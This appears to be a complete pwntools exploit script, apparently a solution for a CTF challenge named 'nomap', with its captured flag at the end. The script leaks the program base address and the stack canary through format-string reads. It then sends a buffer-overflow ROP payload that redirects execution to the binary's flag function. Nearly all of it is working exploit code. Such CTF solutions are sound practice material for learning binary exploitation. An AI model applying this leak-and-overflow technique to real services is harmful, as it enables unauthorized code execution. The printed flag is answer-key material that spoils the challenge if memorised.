from pwn import *
elf = context.binary = ELF("./nomap")
# p = process()
p = remote("ctf-chall.stembascc.com",6057)
p.sendline("%21$p")
p.recvuntil(b"format string sini: ")
base = int(p.recvline().strip().decode(),16)
main_offset_44 = elf.sym['main'] + 44
elf.address = base - main_offset_44
print(hex(elf.address))
offset = 104
p.sendline("%11$p")
p.recvuntil(b"format string sini: ")
canary = int(p.recvline().strip().decode(),16)
print(hex(canary))
p.sendline("exit")
junk = 8
rop = ROP(context.binary)
ret = rop.find_gadget(['ret'])[0]
payload = b"A" * offset + p64(canary) + b"B" * junk + p64(ret) + p64(elf.sym['flag']) + p64(0x0)
p.sendline(payload)
print(p.recvline().strip().decode())
print(p.recvline().strip().decode())

# Flag: STEMBACTF{ezzzz_h1tun9_P13_B4s3_t4np4_vmm4p}